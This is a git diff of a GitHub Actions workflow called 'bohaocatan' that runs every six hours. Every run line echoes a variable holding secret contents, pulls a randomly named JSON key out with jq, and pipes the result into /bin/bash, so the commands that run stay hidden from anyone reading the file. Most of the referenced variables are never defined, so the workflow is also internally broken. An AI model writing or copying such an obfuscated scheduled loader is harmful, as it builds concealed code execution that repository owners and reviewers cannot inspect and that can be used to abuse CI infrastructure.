@@ -3,8 +3,7 @@ name: bohaocatan
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 3/6 * * *'
-
+    - cron: '55 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,21 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: bohaocatan
         env:
-          fnejo1: ${{ secrets.fnejo1 }}
+          i00: ${{ secrets.i00 }}
         run: |
-          echo $fnejo1 | jq -r .xq15716 | /bin/bash
-          echo $mja742 | jq -r .kyc909 | /bin/bash
-          echo $yhpd6 | jq -r .yvqoh97860 | /bin/bash
-          echo $fwjkd019 | jq -r .eqtux4393 | /bin/bash
-          echo $sgck0 | jq -r .uh05 | /bin/bash
-          echo $epxa6119 | jq -r .kao8 | /bin/bash
-          echo $an83846 | jq -r .wqnz88080 | /bin/bash
-          echo $v42137 | jq -r .jqsre36735 | /bin/bash
-          echo $c212 | jq -r .en889 | /bin/bash
-          echo $fqxwa6 | jq -r .whn8161 | /bin/bash
-          echo $x8 | jq -r .zeg5410 | /bin/bash
-          echo $oq0224 | jq -r .z55 | /bin/bash
-          echo $krm55 | jq -r .amcad33 | /bin/bash
-          echo $p7 | jq -r .r1198 | /bin/bash
-          echo $r60934 | jq -r .i8404 | /bin/bash
+          echo $i00 | jq -r .yzhh70 | /bin/bash
+          echo $awb6 | jq -r .xjlcm718 | /bin/bash
+          echo $akh2 | jq -r .eoqr5583 | /bin/bash
+          echo $xfw0884 | jq -r .x75 | /bin/bash
 
